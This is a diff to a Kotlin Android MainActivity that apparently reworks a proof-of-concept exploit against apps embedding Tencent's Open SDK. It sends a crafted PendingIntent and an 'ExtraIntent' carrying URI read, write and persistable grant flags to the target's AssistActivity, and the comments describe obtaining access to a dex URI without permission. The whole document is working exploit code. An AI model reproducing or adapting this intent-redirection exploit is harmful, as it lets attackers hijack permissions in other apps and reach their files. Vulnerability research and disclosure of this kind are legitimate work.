@@ -686,9 +686,9 @@ class MainActivity : AppCompatActivity() {
                     }
                 } else {
                     // 无权限，通过 AssistActivity + PendingIntent 授权
-                    // intent2: 指向 Android 系统设置主页，携带 dex URI
+                    // intent2: 合并「系统设置主页」与「分享请求参数」，作为 PendingIntent 与 ExtraIntent 的统一载体
 
-                    // 先获取 MIME type，捕获 getType 的错误
+                    // 先获取 MIME type，捕获 getType 的错误（校验 dexUri 可访问）
                     var mimeType: String? = null
                     try {
                         mimeType = contentResolver.getType(dexUri)
@@ -709,9 +709,10 @@ class MainActivity : AppCompatActivity() {
                         return@Thread
                     }
 
+                    // intent2: 合并原 intent2（系统设置主页 + 授权 flags）与原 extraIntent（分享请求参数）
                     val intent2 = Intent()
                         .setComponent(ComponentName("com.android.settings", "com.android.settings.Settings"))
-                        .setDataAndType(dexUri, mimeType)
+                        .setData(Uri.parse("https://openmobile.qq.com/share?share_id=poc_001"))
                         .addFlags(
                             Intent.FLAG_GRANT_READ_URI_PERMISSION or
                             Intent.FLAG_GRANT_WRITE_URI_PERMISSION or
@@ -719,8 +720,11 @@ class MainActivity : AppCompatActivity() {
                             Intent.FLAG_ACTIVITY_NEW_TASK
                         )
                         .putExtra(STARTANYWHERE_CALLBACK, "true")
+                        .putExtra("key_request_code", 0x2782)
+                        .putExtra("appid", "1106798370")
+                        .putExtra("for_result", false)
 
-                    // 创建 PendingIntent
+                    // 创建 PendingIntent（基于合并后的 intent2）
                     val pendingIntent = android.app.PendingIntent.getActivity(
                         this, 0, intent2,
                         android.app.PendingIntent.FLAG_UPDATE_CURRENT
@@ -731,22 +735,7 @@ class MainActivity : AppCompatActivity() {
                         .setComponent(ComponentName(targetPackage, "com.tencent.connect.common.AssistActivity"))
                         .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
 
-                    // 构造 extraIntent（携带请求码、appid、for_result、data）
-                    val extraIntent = Intent()
-                    extraIntent.putExtra("key_request_code", 0x2782)
-                    extraIntent.putExtra("appid", "1106798370")
-                    extraIntent.putExtra("for_result", false)
-                    extraIntent.setData(Uri.parse("https://openmobile.qq.com/share?share_id=poc_001"))
-                    // 补上 intent2 所添加的 flags 与 extra
-                    extraIntent.addFlags(
-                        Intent.FLAG_GRANT_READ_URI_PERMISSION or
-                        Intent.FLAG_GRANT_WRITE_URI_PERMISSION or
-                        Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION or
-                        Intent.FLAG_ACTIVITY_NEW_TASK
-                    )
-                    extraIntent.putExtra(STARTANYWHERE_CALLBACK, "true")
-
-                    intent1.putExtra("openSDK_LOG.AssistActivity.ExtraIntent", extraIntent)
+                    intent1.putExtra("openSDK_LOG.AssistActivity.ExtraIntent", intent2)
                     intent1.putExtra("key_extra_pending_intent", pendingIntent)
                     intent1.putExtra("is_login", true)
 
